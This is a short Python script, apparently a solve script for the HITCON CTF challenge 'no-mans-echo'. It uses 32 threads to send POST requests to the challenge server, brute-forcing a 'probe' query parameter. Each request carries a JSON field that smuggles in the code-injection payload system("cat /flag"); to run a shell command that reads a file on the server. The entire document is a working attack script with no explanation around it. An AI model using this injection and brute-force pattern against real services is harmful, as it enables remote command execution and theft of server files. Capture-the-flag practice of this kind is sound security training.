import requests
from concurrent.futures import ThreadPoolExecutor, as_completed

# URL = "http://localhost:1234/"
URL = "http://no-mans-echo.chal.hitconctf.com/"

DATA = b'{"signal": "Arrival", "logogram": "system(\\"cat /flag\\");"}'

def probe(x):
    try:
        r = requests.post(f"{URL}?probe={x}", data=DATA, timeout=16)

        return x, r.text
    except Exception as e:
        return x, f"ERROR: {e}"

def main():
    with ThreadPoolExecutor(max_workers=32) as executor:
        futures = [executor.submit(probe, x) for x in range(65536, 1, -42)]
        for future in as_completed(futures):
            x, result = future.result()
            if "<code>" not in result:
                print(x, result)
            else:
                print(x)

if __name__ == "__main__":
    main()

